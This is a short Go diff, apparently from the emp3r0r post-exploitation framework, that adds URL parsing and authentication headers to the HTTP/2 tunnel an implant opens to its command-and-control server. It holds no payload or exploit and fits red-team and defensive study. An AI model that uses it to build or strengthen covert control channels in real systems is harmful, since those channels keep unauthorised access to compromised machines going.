@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"net/http"
+	neturl "net/url"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -17,8 +18,22 @@ func EstablishC2Connection(url string) (conn *h2conn.Conn, ctx context.Context, 
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
+	targetURL, parseErr := neturl.Parse(url)
+	if parseErr != nil {
+		cancel()
+		return nil, nil, nil, fmt.Errorf("parse url: %w", parseErr)
+	}
+
+	headers, err := buildAuthHeaders(http.MethodPost, targetURL)
+	if err != nil {
+		cancel()
+		return nil, nil, nil, fmt.Errorf("build auth headers: %w", err)
+	}
+
 	h2 := h2conn.Client{
 		Client: def.HTTPClient,
+		Method: http.MethodPost,
+		Header: headers,
 	}
 	logging.Printf("EstablishC2Connection: connecting to %s", url)
 
